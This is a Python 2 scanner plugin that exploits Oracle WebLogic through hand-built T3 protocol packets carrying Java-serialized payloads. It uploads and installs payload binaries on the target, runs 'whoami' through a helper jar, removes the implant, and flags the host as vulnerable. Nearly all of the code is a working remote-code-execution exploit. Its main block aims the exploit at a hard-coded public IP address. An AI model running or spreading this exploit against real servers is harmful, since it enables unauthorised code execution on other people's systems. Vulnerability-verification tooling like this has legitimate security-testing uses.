#coding:utf-8

from t import T
import socket

import struct

import os
import platform
import subprocess
import signal
import time

class TimeoutError(Exception):
    pass

def command(cmd, timeout=20):
    """Run command and return the output
    cmd - the command to run
    timeout - max seconds to wait for
    """
    is_linux = platform.system() == 'Linux'

    p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid if is_linux else None)
    if timeout==0:
        return p.stdout.read()
    t_beginning = time.time()
    seconds_passed = 0
    while True:
        if p.poll() is not None:
            break
        seconds_passed = time.time() - t_beginning
        if timeout and seconds_passed > timeout:
            if is_linux:
                os.killpg(p.pid, signal.SIGTERM)
            else:
                p.terminate()
            raise TimeoutError(cmd, timeout)
        time.sleep(0.1)
    return p.stdout.read()

class WeblogicExp:

    def __init__(self, host=None, port=None, os_type=None, verbose=True):
        self.__java_shell = 'java -jar '+os.path.split(os.path.realpath(__file__))[0]+'/shellApp.jar '
        self.socket_timeout = 10
        self.host = host
        self.port = int(port) if port is not None else None
        self.os_type = os_type
        self.verbose = verbose

    @classmethod
    def __get_payload_bin(self, payload_type, os_type):
        host_platform_name = 'Windows' if os_type == 'win' else 'Linux'
        payload_file = os.path.split(os.path.realpath(__file__))[0]+'/payload_bin/payload_%s_%s.bin' % (
            host_platform_name, payload_type)
        with open(payload_file, 'rb') as f:
            return f.read()

    def __print_msg(self, msg):
        if self.verbose:
            print msg

    def __t3_send(self, payload_bin):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.host, self.port)
            sock.settimeout(self.socket_timeout)
            # print 'connecting to %s port %s' % server_address
            sock.connect(server_address)
            # Send headers
            headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
            # print 'sending Hello'
            sock.sendall(headers)
            data = sock.recv(1024)
            #print >>sys.stderr, 'received "%s"' % data
            if not data.startswith('HELO'):
                msg = 't3_send exception: receive HELO fail!'
                self.__print_msg(msg)
                return (False, msg)

            payload = '\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
            payload = payload + payload_bin
            payload = payload + \
                '\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78'
            payloadLength = len(payload) + 4
            temp = struct.pack('>I', payloadLength)
            payload = temp + payload
            #payload = '\x00\x00\x09\xf1'+payload
            # print 'sending payload...length:%s' %len(payload)
            sock.send(payload)
            # print "send OK!"

            sock.close()
            return (True, 'ok')

        except Exception, e:
            msg = "t3_send exception:%s" % e
            self.__print_msg(msg)
            return (False, msg)

    def __shell_send(self, cmd):
        run_cmd = '%s %s %s %s %s' % (
            self.__java_shell, self.host, self.port, self.os_type, cmd)
        app = command(run_cmd)


        return app

    def __weblogic_connect(self):
        #
        self.__print_msg("sending upload payload...")
        #
        payload_upload_inst = self.__get_payload_bin(
            'upload_inst', self.os_type)
        (result, msg) = self.__t3_send(payload_upload_inst)
        if not result:
            return (result, msg)
        #
        self.__print_msg("sending install payload...")
        #
        payload_inst = self.__get_payload_bin('inst', self.os_type)
        (result, msg) = self.__t3_send(payload_inst)
        if not result:
            return (result, msg)
        #
        return (True, 'ok')

    def __weblogic_disconn(self):
        #
        self.__print_msg("sending upload payload...")
        #
        payload_upload_uninst = self.__get_payload_bin(
            'upload_uninst', self.os_type)
        (result, msg) = self.__t3_send(payload_upload_uninst)
        if not result:
            return (result, msg)
        #
        self.__print_msg("sending uninstall payload...")
        #
        payload_uninst = self.__get_payload_bin('uninst', self.os_type)
        (result, msg) = self.__t3_send(payload_uninst)
        if not result:
            return (result, msg)
        #
        self.__print_msg("sending delete payload...")
        #
        payload_delete = self.__get_payload_bin('delete', self.os_type)
        (result, msg) = self.__t3_send(payload_delete)
        if not result:
            return (result, msg)
        #
        return (True, 'ok')

    @classmethod
    def __check_verify_response(self, msg):
        if msg == None:
            return False
        if msg == '':
            return False
        fail_msg_keywords=('null','exception','Exception','error','Error','/bin/sh','cmd.exe')
        for kw in fail_msg_keywords:
            if msg.find(kw) >=0:
                return False

        return True

    def verify(self):
        (result, msg) = self.__weblogic_connect()
        if not result:
            return (result, msg)
        #
        self.__print_msg('execute "whoami"...')
        self.__print_msg('-'*40)
        #
        result_msg = self.__shell_send("whoami")
        result_msg = result_msg.strip()
        #
        self.__print_msg(result_msg)
        self.__print_msg('-'*40)
        #
        (result, msg) = self.__weblogic_disconn()
        if not result:
            return (result, msg)

        verify_result = self.__check_verify_response(result_msg)

        return (verify_result, result_msg)









class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False


        resultmsg=False
        try:

            app = WeblogicExp(ip, port, 'win', verbose=True)
            (resultmsg, msg) = app.verify()
            if resultmsg ==False:
                app = WeblogicExp(ip, port, 'linux', verbose=True)
                (resultmsg, msg) = app.verify()
        except Exception,e :
            print 'weblogic_unrec there is error'+str(e)
            return result

        if  resultmsg:
            info = target_url + " weblogic unrec vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='weblogic unrec vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=''
            result['VerifyInfo']['result'] =msg
            result['VerifyInfo']['level'] = 'hole'
        return result





if __name__ == '__main__':
    print P().verify(ip='125.88.59.131',port='8001')
